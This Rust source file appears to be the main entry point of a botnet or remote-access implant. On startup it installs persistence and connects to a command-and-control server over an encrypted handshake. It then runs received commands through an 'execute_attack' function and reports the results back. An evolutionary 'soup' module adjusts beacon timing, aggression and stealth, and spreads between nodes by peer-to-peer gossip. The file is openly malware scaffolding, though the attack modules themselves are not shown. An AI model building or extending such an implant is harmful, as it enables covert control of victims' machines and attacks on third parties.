#![forbid(unsafe_code)]

mod config;
mod communication;
mod commands;
mod crypto;
mod error;
mod persistence;
mod attacks;
mod encryption;
mod utils;
mod p2p;
mod agentic;
mod recon;
mod compute;
mod db;
mod evolution;
mod behavior;

use config::FullConfig;
use db::ClientDb;
use communication::connect_to_c2;
use persistence::add_persistence;
use attacks::execute_attack;
use commands::CommandResult;
use error::handle_error;
use tokio::runtime::Runtime;
use std::sync::Arc;

fn main() {
    let config = FullConfig::load();
    add_persistence();

    let db = Arc::new(
        ClientDb::open(&config.database.path)
            .unwrap_or_else(|_| ClientDb::open_memory().expect("in-memory db"))
    );

    let node_id: Vec<u8> = {
        let id = uuid::Uuid::new_v4();
        id.as_bytes().to_vec()
    };

    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        // Spawn the evolutionary soup -- a local Tierra/Avida world running on a
        // dedicated thread, fed by network telemetry as its ocean (arXiv:2409.01469).
        // Creature phenotype drives C2 timing, fanout, aggression, and routing
        // (arXiv:2603.15655, arXiv:2609.17320).
        let mut evo = evolution::EvolutionEngine::new(node_id.clone());
        eprintln!("[*] Evolution soup spawned");

        if let Ok(Some(state_bytes)) = db.load_evolution_state() {
            match bincode::deserialize::<stalinium_evolution::node::SoupState>(&state_bytes) {
                Ok(state) => {
                    if evo.load_state(state).await.is_ok() {
                        eprintln!("[*] Evolution state restored");
                    }
                }
                Err(e) => eprintln!("[!] Evolution state corrupt: {}", e),
            }
        }

        let evo_snap_rx = evo.snapshot_watch();

        let gossip_engine: Option<Arc<p2p::gossip::GossipEngine>> = if config.p2p.enabled {
            let gossip_addr: std::net::SocketAddr = config.p2p.gossip_address.parse()
                .expect("Invalid P2P gossip address");
            let bootstrap: Vec<std::net::SocketAddr> = config.p2p.bootstrap_peers.iter()
                .filter_map(|s| s.parse().ok())
                .collect();
            let peer_mgr = Arc::new(
                p2p::peer::PeerManager::new(gossip_addr, bootstrap, config.p2p.max_peers)
            );
            match p2p::gossip::GossipEngine::new(gossip_addr, peer_mgr).await {
                Ok(engine) => {
                    let engine = Arc::new(engine);
                    engine.start();
                    eprintln!("[*] P2P gossip: {}", config.p2p.gossip_address);
                    Some(engine)
                }
                Err(e) => {
                    eprintln!("[!] P2P failed: {}", e);
                    None
                }
            }
        } else {
            None
        };

        // Background task: evolution cycle with behavior-driven timing.
        // Runs regardless of P2P; gossip enables creature migration between nodes.
        // The soup's phenotype continuously modulates this loop's cadence.
        {
            let gossip_for_evo = gossip_engine.as_ref().map(Arc::clone);
            let db_for_evo = Arc::clone(&db);
            tokio::spawn(async move {
                let mut tick_ms: u64 = 10_000;
                let mut save_counter: u64 = 0;

                loop {
                    tokio::time::sleep(std::time::Duration::from_millis(tick_ms)).await;

                    // Drain incoming creature migrations from gossip
                    let peer_count = if let Some(ref engine) = gossip_for_evo {
                        let mut incoming: Vec<stalinium_evolution::node::Migrant> = Vec::new();
                        {
                            let mut cmds = engine.command_rx.write().await;
                            cmds.retain(|(id, payload)| {
                                if id.starts_with("evo:") {
                                    if let Ok(migrants) = serde_json::from_slice::<Vec<stalinium_evolution::node::Migrant>>(payload) {
                                        incoming.extend(migrants);
                                    }
                                    false
                                } else {
                                    true
                                }
                            });
                        }
                        if !incoming.is_empty() {
                            evo.receive_migrants(incoming).await;
                        }
                        engine.peer_count().await
                    } else {
                        0
                    };

                    evo.tick(peer_count, 0, 0, 0, 0);

                    if let Some(emigrants) = evo.cycle().await {
                        if let Some(ref engine) = gossip_for_evo {
                            let fanout = evo.swarm_params().gossip_fanout;
                            if let Ok(payload) = serde_json::to_vec(&emigrants) {
                                engine.broadcast_creatures(payload, fanout).await;
                            }
                        }
                    }

                    let params = evo.swarm_params();
                    tick_ms = params.beacon_interval_ms.clamp(5000, 60000);

                    let snap = evo.snapshot();
                    if snap.epoch > 0 && snap.epoch % 50 == 0 {
                        eprintln!(
                            "[*] Evo e{} pop={} div={} genes={} comp={} agg={:.2} stl={:.2} fan={} bms={}",
                            snap.epoch, snap.population, snap.diversity, snap.alive_genes,
                            snap.computing, snap.behavior.aggression, snap.behavior.stealth,
                            params.gossip_fanout, params.beacon_interval_ms
                        );
                    }

                    save_counter += 1;
                    if save_counter == 1 || save_counter % 10 == 0 {
                        match evo.save_state().await {
                            Ok(state) => match bincode::serialize(&state) {
                                Ok(bytes) => {
                                    if let Err(e) = db_for_evo.save_evolution_state(&bytes) {
                                        eprintln!("[!] Evo state db write failed: {}", e);
                                    }
                                }
                                Err(e) => eprintln!("[!] Evo state serialize failed: {}", e),
                            },
                            Err(e) => eprintln!("[!] Evo state save failed: {}", e),
                        }
                    }
                }
            });
        }

        match connect_to_c2(&config.settings).await {
            Ok(mut socket) => {
                let handshake = match crypto::handshake::client_handshake(&mut socket).await {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("[!] PQ handshake failed: {}", e);
                        return;
                    }
                };
                let key = handshake.session_key;
                eprintln!("[+] PQ session established");

                loop {
                    let command = match communication::receive_command(&mut socket, &key).await {
                        Ok(cmd) => cmd,
                        Err(e) => {
                            handle_error(e);
                            break;
                        }
                    };

                    let _ = db.insert_command(command.id, &command.command, &command.args);

                    let result_str = match execute_attack(&command, &evo_snap_rx).await {
                        Ok(data) => data,
                        Err(e) => format!("Error: {}", e),
                    };

                    let _ = db.update_command_result(command.id, &result_str);

                    let result = CommandResult {
                        id: command.id,
                        result: result_str,
                    };

                    if let Err(e) = communication::send_result(&mut socket, &result, &key).await {
                        handle_error(e);
                        break;
                    }
                }
            }
            Err(e) => handle_error(e),
        }
    });
}
